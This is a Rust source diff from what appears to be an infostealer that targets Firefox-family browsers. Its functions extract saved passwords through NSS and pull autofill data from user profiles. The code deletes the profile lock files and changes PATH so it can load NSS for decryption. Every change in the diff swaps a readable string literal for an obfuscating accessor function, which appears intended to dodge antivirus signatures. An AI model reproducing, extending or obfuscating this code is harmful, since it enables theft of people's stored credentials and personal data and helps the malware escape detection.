@@ -62,20 +62,20 @@ pub fn extract_passwords_nss(profile_path: &Path, nss_dir: &Path) -> Option<Stri
         return None;
     }
 
-    let parent_lock = profile_path.join("parent.lock");
+    let parent_lock = profile_path.join(s_gck_parent_lock_file());
     if parent_lock.exists() {
         let _ = fs::remove_file(&parent_lock);
     }
     if let Some(parent) = profile_path.parent() {
-        let parent_lock2 = parent.join("parent.lock");
+        let parent_lock2 = parent.join(s_gck_parent_lock_file());
         if parent_lock2.exists() {
             let _ = fs::remove_file(&parent_lock2);
         }
     }
 
-    let original_path = env::var("PATH").unwrap_or_default();
+    let original_path = env::var(s_env_path()).unwrap_or_default();
     unsafe {
-        env::set_var("PATH", format!("{};{}", nss_dir.display(), original_path));
+        env::set_var(s_env_path(), format!("{};{}", nss_dir.display(), original_path));
     }
 
     let result = (|| -> Option<String> {
@@ -139,7 +139,7 @@ pub fn extract_passwords_nss(profile_path: &Path, nss_dir: &Path) -> Option<Stri
     })();
 
     unsafe {
-        env::set_var("PATH", original_path);
+        env::set_var(s_env_path(), original_path);
     }
     result
 }
@@ -362,7 +362,7 @@ pub fn extract_autofill(profile_path: &Path) -> Option<String> {
 
 pub fn display_profile_name(ini_name: &str) -> String {
     if ini_name.eq_ignore_ascii_case("default") {
-        "Default".to_string()
+        s_gck_profile_default()
     } else {
         ini_name.to_string()
     }
@@ -398,10 +398,11 @@ pub fn parse_profiles_ini(ini: &Path, profiles_dir: &Path) -> Vec<(String, PathB
             continue;
         }
         if let Some((key, value)) = line.split_once('=') {
-            match key.trim() {
-                "Name" => current_name = Some(value.trim().to_string()),
-                "Path" => current_path = Some(value.trim().to_string()),
-                _ => {}
+            let k = key.trim();
+            if k == s_gck_ini_key_name() {
+                current_name = Some(value.trim().to_string());
+            } else if k == s_gck_ini_key_path() {
+                current_path = Some(value.trim().to_string());
             }
         }
     }
